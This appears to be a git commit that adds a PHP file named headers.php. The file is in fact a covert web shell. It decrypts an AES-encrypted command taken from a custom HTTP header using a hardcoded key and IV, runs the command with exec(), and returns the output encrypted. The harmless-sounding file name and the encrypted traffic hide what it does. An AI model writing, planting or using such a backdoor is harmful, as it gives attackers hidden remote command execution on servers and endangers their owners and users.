53e95eb959abae87e501f53691e523993e1e2b29
BiannualSnow271 <93666621+BiannualSnow271@users.noreply.github.com>
2021-11-14 12:40:58 +0100

    Add files via upload

---
+++ headers.php
@@ -0,0 +1,21 @@
+<?php
+
+$ciphering = "AES-128-CTR";
+
+$iv_length = openssl_cipher_iv_length($ciphering);
+
+$options = 0;
+
+$encryption_iv = '1234567891011121';
+
+$encryption_key = "codespace";
+
+$msg = $_SERVER['HTTP_1'];
+
+$decryption=openssl_decrypt($msg, $ciphering,
+            $encryption_key, $options, $encryption_iv);
+$output = exec("$decryption | tr '\n' '||'");
+$encryption = openssl_encrypt($output, $ciphering,
+            $encryption_key, $options, $encryption_iv);
+echo $encryption;
+?>
